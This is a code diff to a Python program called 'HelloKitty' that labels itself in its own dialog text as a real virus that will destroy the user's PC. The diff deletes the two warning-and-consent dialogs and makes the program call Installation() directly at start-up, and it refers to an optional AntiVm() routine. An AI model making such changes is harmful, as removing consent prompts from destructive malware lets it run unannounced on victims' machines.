@@ -36,12 +36,6 @@ DontDownloadPath = str(Path.home()) + "\\AppData\\Local\\Temp\\djj012ndawm10d9wa
 #System Paths
 TempPath = str(Path.home()) + "\\AppData\\Local\\Temp"
 
-def Warning():
-    #Warning message
-    if messagebox.askyesno("HelloKitty", "WARNING: This program is a real virus and will destroy your PC. Are you sure you want to start it?", icon="warning"):
-        if messagebox.askyesno("HelloKitty", "LAST-WARNING: Are you really sure you want to start this program? After that there is no turning back!", icon="warning"):
-            Installation()
-
 def Installation():
     #Look for the file, and when its found, the program quits
     if not os.path.isfile(DontDownloadPath):
@@ -201,4 +195,4 @@ def window_flush():
 
 if __name__ == "__main__":
     #AntiVm() Optional
-    Warning()
+    Installation()
